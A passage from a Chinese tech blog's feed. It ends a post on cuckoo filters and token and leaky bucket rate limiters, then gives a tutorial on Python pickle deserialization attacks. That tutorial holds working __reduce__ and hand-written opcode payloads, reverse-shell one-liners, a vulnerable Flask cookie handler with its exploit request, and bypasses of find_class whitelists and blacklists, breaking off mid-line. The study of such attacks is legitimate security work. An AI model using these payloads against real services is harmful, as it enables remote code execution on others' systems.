比如不再设置两个巢，而是较多的巢来保证可以将循环降低。</p><p>随着布谷鸟过滤器的装满，插入将变得缓慢，因为需要踢走更多的物品。如果程序对插入时间很敏感，布谷鸟过滤器并不一定适合。</p><p>另外还有一个明显的问题就是，如果插入一个数据插入了多次，就会产生自己踢自己的结果，将导致几个位置上都是同一个数据，不止如此还会提早的达到数组阈值。导致空间利用率底下。也许可以使用一次查询来解决此问题。</p><p>但是删除的时候会出现一定概率的误删。因为不同的元素被 hash 到同一个位置的可能性还是很大的，而且指纹只有一个字节，256 种可能，同一个位置出现相同的指纹可能性也很大。如果两个元素的 hash 位置相同，指纹相同，那么这个插入检查会认为它们是相等的。</p><h3 id="python实现布谷鸟过滤器"><a href="#python实现布谷鸟过滤器" class="headerlink" title="python实现布谷鸟过滤器"></a>python实现布谷鸟过滤器</h3><pre><code>pip install cuckoopy</code></pre><pre><code>from cuckoopy import CuckooFilterck = CuckooFilter(capacity=1000, bucket_size=4, fingerprint_size=1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)print(ck.contains(&#39;hello&#39;), ck.size)</code></pre><p>这种情况下，当插入同一个数据超过八次的时候，由于两个桶的八个座位都被一个数据占用，会出现循环踢的情况，超过阈值导致认为数据桶一件满了。</p><pre><code>cuckoopy.exceptions.CuckooFilterFullException: Insert operation failed. Filter is full.</code></pre><p>所以在使用布谷鸟过滤器的时候，需要先进行一次查询，如果数据存在则不在进行插入。</p><pre><code>from cuckoopy import CuckooFilterck = CuckooFilter(capacity=1000, bucket_size=4, fingerprint_size=1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)if not ck.contains(&#39;hello&#39;):    ck.insert(&#39;hello&#39;)else:    print(&quot;数据重复！&quot;)print(ck.contains(&#39;hello&#39;), ck.size)  #数据重复！ True 1</code></pre><h3 id="redis-使用-1"><a href="#redis-使用-1" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>使用方式跟布隆过滤器基本一致，需要把bf改为cf即可</p><pre><code>CF.RESERVE newCuckooFilter 1000  #新建一个过滤器CF.ADD newCuckooFilter foo  #增加一个值CF.EXISTS newCuckooFilter foo  #判断是否存在CF.DEL newCuckooFilter foo  #删除</code></pre><p>同样使用上面的脚本</p><pre><code>from redisbloom.client import Clientclass _redis_cuckoo(object):    def __init__(self, size, key=&#39;name&#39;):        self.size = size        self.key = key        self.rb = Client(host=&#39;106.54.181.x&#39;, port=6379)        self.rb.cfCreate(self.key,self.size)    def insert(self, name):        if self.rb.cfExists(self.key, name) == 0:            self.rb.cfAdd(self.key, name)            return True        else:            return Falserd = _redis_cuckoo(size=10000)for i in range(0, 5000):    rd.insert(i)</code></pre><h2 id="令牌桶算法"><a href="#令牌桶算法" class="headerlink" title="令牌桶算法"></a>令牌桶算法</h2><p>令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py" target="_blank" rel="noopener">https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py</a></p><pre><code>import timefrom threading import RLock__all__ = (&quot;TokenBucket&quot;, )class TokenBucket(object):    def __init__(self, capacity, fill_rate, is_lock=False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param fill_rate:  The rate in tokens/second that the bucket will be refilled        &quot;&quot;&quot;        self._capacity = float(capacity)        self._tokens = float(capacity)        self._fill_rate = float(fill_rate)        self._last_time = time.time()        self._is_lock = is_lock        self._lock = RLock()    def _get_cur_tokens(self):        if self._tokens &lt; self._capacity:            now = time.time()            delta = self._fill_rate * (now - self._last_time)  # 计算从上次发送到这次发送，新发放的令牌数量            self._tokens = min(self._capacity, self._tokens + delta) # 令牌数量不能超过桶的容量            self._last_time = now        return self._tokens    def get_cur_tokens(self):        if self._is_lock:            with self._lock:                return self._get_cur_tokens()        else:            return self._get_cur_tokens()    def _consume(self, tokens):        if tokens &lt;= self.get_cur_tokens():  # 如果没有足够的令牌，则不能发送数据            self._tokens -= tokens            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._is_lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)</code></pre><p>调用的方式是传入需要的令牌数，比如</p><pre><code>tk = TokenBucket(capacity=10, fill_rate=10)  #容量10，每秒10个令牌while True:    if tk.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        time.sleep(1)</code></pre><p>会显示如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200508164220582.png" alt="image-20200508164220582"></p><p>当桶内令牌又新增的时候会继续发送。</p><h2 id="漏桶算法"><a href="#漏桶算法" class="headerlink" title="漏桶算法"></a>漏桶算法</h2><p>漏桶算法(Leaky Bucket)它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py" target="_blank" rel="noopener">https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py</a></p><pre><code>from time import time, sleepfrom threading import RLock__all__ = (&quot;LeakyBucket&quot;, )class LeakyBucket(object):    def __init__(self, capacity, leak_rate, is_lock=False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param leak_rate:  The rate in tokens/second that the bucket leaks        &quot;&quot;&quot;        self._capacity = float(capacity)        self._used_tokens = 0        self._leak_rate = float(leak_rate)        self._last_time = time()        self._lock = RLock() if is_lock else None    def get_used_tokens(self):        if self._lock:            with self._lock:                return self._get_used_tokens()        else:            return self._get_used_tokens()    def _get_used_tokens(self):        now = time()        delta = self._leak_rate * (now - self._last_time)     #间隔时间新泄露的漏桶令牌数        self._used_tokens = max(0, self._used_tokens - delta)   #获取数不超过漏桶最大容量        return self._used_tokens    def _consume(self, tokens):        if tokens + self._get_used_tokens() &lt;= self._capacity:  #小于桶容量继续存储            self._used_tokens += tokens            self._last_time = time()            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)</code></pre><p>使用类似如上的方法调用</p><pre><code>ck = LeakyBucket(capacity=20, leak_rate=5)   #桶容量20，每秒泄露5while True:    if ck.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        sleep(1)</code></pre><p>结果首先把桶内的泄露完，此后每秒泄露五个。如果修改泄露数为30，这样结果任然是最多20个泄露。</p><p>参考文章：<a href="https://www.cnblogs.com/yscl/p/12003359.html" target="_blank" rel="noopener">https://www.cnblogs.com/yscl/p/12003359.html</a></p><p>​                        <a href="https://www.cnblogs.com/chuxiuhong/p/8215719.html" target="_blank" rel="noopener">https://www.cnblogs.com/chuxiuhong/p/8215719.html</a></p><p>​                        <a href="https://zhuanlan.zhihu.com/p/68418134" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/68418134</a></p><p>​                        <a href="https://www.jianshu.com/p/c02899c30bbd" target="_blank" rel="noopener">https://www.jianshu.com/p/c02899c30bbd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;布隆过滤器&quot;&gt;&lt;a href=&quot;#布隆过滤器&quot; class=&quot;headerlink&quot; title=&quot;布隆过滤器&quot;&gt;&lt;/a&gt;布隆过滤器&lt;/h2&gt;&lt;h3 id=&quot;什么是布隆过滤器？&quot;&gt;&lt;a href=&quot;#什么是布隆过滤器？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 反序列化</title>
    <link href="/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>/2020/04/python-反序列化/</id>
    <published>2020-04-26T07:11:44.000Z</published>
    <updated>2020-05-26T08:49:23.420Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化库"><a href="#反序列化库" class="headerlink" title="反序列化库"></a>反序列化库</h2><p>python 序列化和反序列化使用最为频繁的是<code>cPickle</code>和<code>pickle</code>，前者是C语言实现，据说速度比后者快很多。</p><p>只不过python3标准库中不再叫<code>cPickle</code>，而是只有<code>pickle</code>。python2中两者都有。</p><p>python2中的序列化文件如果想在python3中读取，需要修改编码。</p><pre><code>#python2with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    l = list(pickle.load(f))#python3with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    u = pickle._Unpickler(f)    u.encoding = &#39;latin1&#39;    p = u.load()</code></pre><p>除此之外，还有一些其他的第三方序列化库，比如</p><pre><code># marshmallowpip3 install marshmallow# MessagePackpip3 install msgpack-python</code></pre><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>问题是序列化为什么会产生漏洞，是序列化本身处理有问题，被外来的EXP攻击导致漏洞执行了嘛。因为<code>pickle</code>允许我们用数据表示任意对象。官方也在一开始就表述问题的严重性。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426165819294.png" alt="image-20200426165819294"></p><p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。</p><pre><code>__reduce__被定义之后，当对象被Pickle时就会被调用要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用__reduce_ex__首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__</code></pre><p>利用构造一个存在漏洞的简单代码：</p><pre><code>#encoding: utf-8import osimport pickleclass test(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))a=test()payload=pickle.dumps(a)print payloadpickle.loads(payload)</code></pre><p>在python2和python3的输出为：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426171205336.png" alt="image-20200426171205336"></p><p>其中代表的含义</p><pre><code># \x80：协议头声明 \x03：协议版本# \x06\x00\x00\x00：数据长度：6  -&gt;  whoami# whoami：数据# q：储存栈顶的字符串长度：一个字节（即\x00）# \x00：栈顶位置# . ：数据截止# c：读取新的一行作为模块名module，读取下一行作为对象名object，nt -&gt;windows，posix -&gt; linux# (：将一个标记对象插入到堆栈中。# S: 实例化一个字符串对象# p：将堆栈中索引为-1的对应存储入内存。# t：构建元组压入堆栈。# R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。</code></pre><p>如果需要在web中请求传输，url编码后就可以发送了。</p><p>如果使用的是<code>__reduce_ex__</code></p><pre><code>#encoding: utf-8import osimport pickleclass test(object):    def __init__(self, cmd):        self.cmd = cmd    def __reduce_ex__(self,cmd):        return (os.system,(self.cmd,))a=test(&#39;whoami&#39;)payload=pickle.dumps(a)print(payload)pickle.loads(payload)</code></pre><p>其中<code>pickle.loads</code>是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。有人整理的执行命令函数。</p><pre><code>eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen</code></pre><p>以及不常用的命令执行函数</p><pre><code>map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))platform.popen(&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)</code></pre><p>如果想手动编写opcode，可用查看<a href="https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。</a></p><p><code>pickle</code>库中针对序列化和反序列化的方法有</p><pre><code>pickle.dump()   #传入一个文件句柄，以二进制的形式写入pickle.dumps()   #参数为字符串，返回一个序列化的byte对象pickle.load()   #同样是操作文件句柄，以二进制形式读取pickle.loads()   #直接从bytes对象中读取序列化值</code></pre><p>还有面向对象的反序列化类。这个类后面会被用到<code>pickle.Unpickler</code>。方法和上面一致操作文件。</p><pre><code>f = open(fileName, &quot;rb&quot;)d = pickle.Unpickler(f)data = d.load()f.close()</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102136100.png" alt="image-20200427102136100"></p><p>带有的方法为<code>&#39;find_class&#39;, &#39;load&#39;, &#39;memo&#39;, &#39;persistent_load&#39;</code></p><p>面向对象的序列化类。<code>pickle.Pickler</code>，其中方法<code>&#39;bin&#39;, &#39;clear_memo&#39;, &#39;dispatch_table&#39;, &#39;dump&#39;, &#39;fast&#39;, &#39;memo&#39;, &#39;persistent_id&#39;</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102434470.png" alt="image-20200427102434470"></p><h3 id="pickle-payload"><a href="#pickle-payload" class="headerlink" title="pickle payload"></a>pickle payload</h3><p>上面都是提到的<code>pickle</code>的函数和序列化、反序列化的东西，现在用一个简单的场景来看一下payload。</p><pre><code>import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>当执行</p><pre><code>&gt;&gt;&gt; class exp(object):...     def __reduce__(self):...             return (os.system,(&#39;whoami&#39;,))...&gt;&gt;&gt; e = exp()&gt;&gt;&gt; s = pickle.dumps(e)&gt;&gt;&gt; response = requests.get(&quot;http://127.0.0.1:5000/&quot;, cookies=dict(user=base64.b64encode(s).decode()))</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427134049774.png" alt="image-20200427134049774"></p><h3 id="Unpickler-find-class"><a href="#Unpickler-find-class" class="headerlink" title="Unpickler find_class()"></a>Unpickler find_class()</h3><p>当然对于这种无限制的任意对象调用，官方也有一定的解决办法，定制<code>find_class()</code>来控制要解封的对象。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200509163651496.png" alt="image-20200509163651496"></p><p>比如如下的一个例子：</p><pre><code>import ioimport picklesafe_builtins = {   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name in safe_builtins:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()   </code></pre><p>那么用这种方式来处理上面的漏洞代码</p><pre><code>import pickleimport ioimport builtinsimport base64from flask import Flask, requestapp = Flask(__name__)@app.route(&quot;/&quot;)def index():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = pickle.loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % username@app.route(&quot;/user&quot;)def user():    try:        user = base64.b64decode(request.cookies.get(&#39;user&#39;))        user = restricted_loads(user)        username = user[&quot;username&quot;]    except:        username = &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameclass RestrictedUnpickler(pickle.Unpickler):    safe_list = {        &#39;range&#39;,        &#39;slice&#39;,        &#39;set&#39;    }    def find_class(self, module, name):        if module == &#39;builtins&#39; and name in safe_list:            return getattr(builtins, name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()        if __name__ == &quot;__main__&quot;:    app.run()</code></pre><p>在<code>user</code>路径下，<code>os</code>模块的命令执行就不能使用了。准确的说只能考虑<code>builtins.*</code>的形式</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427141531306.png" alt="image-20200427141531306"></p><p>那么先来看一个这个函数是怎么调用的，查看文件</p><p><a href="https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py</a></p><p>当读取到第一个字符c的时候，也就是模块名，调用的是<code>load_global</code>方法，查找此方法。</p><pre><code>def load_global(self):        module = self.readline()[:-1].decode(&quot;utf-8&quot;)        name = self.readline()[:-1].decode(&quot;utf-8&quot;)        klass = self.find_class(module, name)        self.append(klass)    dispatch[GLOBAL[0]] = load_global</code></pre><p>把第一参数当作模块，第二个参数当作属性传入<code>find_class</code>中。而<code>find_class</code>：</p><pre><code>def find_class(self, module, name):        # Subclasses may override this.        sys.audit(&#39;pickle.find_class&#39;, module, name)        if self.proto &lt; 3 and self.fix_imports:            if (module, name) in _compat_pickle.NAME_MAPPING:                module, name = _compat_pickle.NAME_MAPPING[(module, name)]            elif module in _compat_pickle.IMPORT_MAPPING:                module = _compat_pickle.IMPORT_MAPPING[module]        __import__(module, level=0)        if self.proto &gt;= 4:            return _getattribute(sys.modules[module], name)[0]        else:            return getattr(sys.modules[module], name)</code></pre><p>其中的代码看起来有点不好理解，其实就是表述官方的导入模块的限制，比如python2中写法</p><pre><code> def find_class(self, module, name):        __import__(module)        mod = sys.modules[module]        klass = getattr(mod, name)        return klass</code></pre><p>看到<code>__import__</code>就大概可以理解，上面说的为啥<code>pickle</code>会自动解决导入的问题。那么这个怎么绕过呢，如果是按照官方给的例子，绕过的形式暂时没有发现。如果按照类似如下限制，<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p><pre><code>import ioimport picklesafe_builtins = {   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot;:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>也就是必须在<code>builtins</code>模块下执行，那么其中哪些函数我们可以调用,python3</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428111024908.png" alt="image-20200428111024908"></p><pre><code>builtins.__getattribute__(&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>是不是有点沙箱逃逸的感觉了，虽然并不一样。</p><h3 id="new-classobj"><a href="#new-classobj" class="headerlink" title="new.classobj"></a>new.classobj</h3><p>python2中的旧式类型，python3中已经弃用，使用<code>type</code>来代替<code>classobj</code>。做用是创建一个新的类型对象。</p><p>使用方法：</p><pre><code>classobj(&#39;className&#39;,(baseClass,),{dictAttr:dictValue,...})from new import classobjmyClass= classobj(&quot;HelloClass&quot;, (object, ), {&quot;name&quot;:&quot;boy&quot;, &quot;school&quot;:&quot;hn&quot;})</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200430093434147.png" alt="image-20200430093434147"></p><p>看到类的名称并不是定义的<code>classobj</code>中的className参数。如果在python2下，如何利用这个模块来执行命令呢。</p><pre><code>classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})</code></pre><p>构造一条完整的命令</p><pre><code>payload2 = pickle.dumps(classobj(&#39;system&#39;, (), {&#39;__getinitargs__&#39;:lambda self,arg=(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;})())pickle.loads(payload2)</code></pre><h3 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h3><p>没有看上面提到的那个文章的，可以先看看这一篇<a href="https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。" target="_blank" rel="noopener">https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。</a></p><p>python3中的opcode：<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/3.8/Lib/pickle.py</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p><p>为啥需要手写opcode，假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用<code>eval</code>，那么利用<code>__reduce__</code>就不能使用了。</p><pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>但是在<code>__reduce__</code>生成的序列化字符串，只能执行一个函数，而且在对open传参的过程中，程序会报错。</p><p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p><p>在这之前，先看一个简单的opcode是如何构造的。利用<code>pickletools</code>来查看，先利用上面的一串利用脚本</p><pre><code>import pickletoolsclass exp(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))e = exp()s = pickle.dumps(e)pickletools.dis(s)</code></pre><p>在python3下生成结果为：</p><pre><code>b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428140432397.png" alt="image-20200428140432397"></p><pre><code>   0: \x80 PROTO      3            #协议版本                2: c    GLOBAL     &#39;nt system&#39;  #把nt.system对象压栈                 os.system   13: q    BINPUT     0            #把对象存储到memo的第0个位置                ...   15: X    BINUNICODE &#39;whoami&#39;     #压入一个utf-8的元素参数               &#39;whoami&#39;   26: q    BINPUT     1            #存储到memo的第1个位置                     ...   28: \x85 TUPLE1                  #将前面的元素参数弹出，组成元组再压栈     (&#39;whoami&#39;,)   29: q    BINPUT     2            #将上面的元组存储到memo的第2个位置           ...   31: R    REDUCE                  #将对象和元组组合执行，结果压栈          os.system(&#39;whoami&#39;)   32: q    BINPUT     3            #存储到memo的第3个位置上                    ...   34: .    STOP                    #停止</code></pre><p>跟python2的对比一下</p><pre><code>cnt                   system                p0                    (S&#39;whoami&#39;            p1                    tp2                   Rp3                   .                     </code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142904682.png" alt="image-20200428142904682"></p><pre><code>    0: c    GLOBAL     &#39;nt system&#39;               #压入对象   11: p    PUT        0                         #存储到memo的0位置   14: (    MARK                                 #压入一个MARK   15: S        STRING     &#39;whoami&#39;              #压入一个字符串   25: p        PUT        1                     #存储到memo的1位置   28: t        TUPLE      (MARK at 14)          #组合参数成元组，相当于一个右括号   29: p    PUT        2                         #存储到memo的第2位置   32: R    REDUCE                               #组合对象和元素，结果压栈   33: p    PUT        3                         #结果存储到memo的第3位置   36: .    STOP                                 #停止</code></pre><p>其中的memo是可以去除的，可以进一步省略为</p><pre><code>cnt                   system                                   (S&#39;whoami&#39;                        tR.   </code></pre><p>从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个</p><pre><code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></pre><p>首先保证模块和调用函数</p><pre><code>cbuiltinsgetattr</code></pre><p>把参数压入，不过其中有个问题，上面压入参数的时候都是字符串，其中却有个对象，如果直接压入明显是报错，要是使用<code>c</code>来导入模块，下面还需要接一个实例，所以这里并不能直接压入单一的对象。也就是需要从某个模块中调用到<code>builtins</code>，例如无限套娃：</p><pre><code>&gt;&gt;&gt; builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)&lt;module &#39;__builtins__&#39; (built-in)&gt;</code></pre><p>但是这里来回连续调用好几次函数，看起来也不好弄，跟上面联合分开查看</p><pre><code>get = builtins.getattr(builtins.__dict__, &#39;get&#39;)builtins = get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)</code></pre><p>只不过到此犯了一个错误，过于依赖其中的魔法函数，导致忘记<code>builtins</code>本身就可以直接调用<code>globals</code>。行吧。。。</p><pre><code>builtins = builtins.globals().get(&#39;builtins&#39;)</code></pre><p>那这里就分块来构造。</p><pre><code>cbuiltinsglobals             #builtins.globals</code></pre><p>那么后面调用get函数，这里知道<code>globals</code>获取的实际是一个<code>dict</code>属性对象。如果想使用<code>get</code>，当然也不能直接用，又要先去获取<code>get</code>。</p><pre><code>cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR.             #builtins.dict.get -&gt; &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;</code></pre><p>再把获取到的<code>get</code>跟上面的函数撮合一下，这里<code>get</code>放在上面，虽说是调用<code>get</code>属性来处理，但是也是在获取到全局属性后，利用<code>get</code>来进行的筛选</p><pre><code>cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tR.</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429143946265.png" alt="image-20200429143946265"></p><p>记得R后要有跟的后续参数或对象，我也没明白为啥，反正没有就会报错，踩这个坑踩了N久。获取到<code>builtins</code>，再去获取其中的函数。</p><pre><code>cbuiltinsgetattr(....                #上文获取到的builtinsS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429144538320.png" alt="image-20200429144538320"></p><p>在某一个黑名单的过滤中，就可以使用此来绕过，在这种黑名单中<code>__reduce__</code>是会先把<code>builtins.getattr(builtins,&#39;eval&#39;)</code>解释为<code>builtins.eval</code>导致被拦截。</p><pre><code>#coding:utf-8import ioimport pickleimport builtinsimport osblacklist = {    &#39;eval&#39;,    &#39;exec&#39;}class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()class exp(object):    def __reduce__(self):        return (builtins.getattr(builtins,&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,))# e = exp()# s = pickle.dumps(e)s = 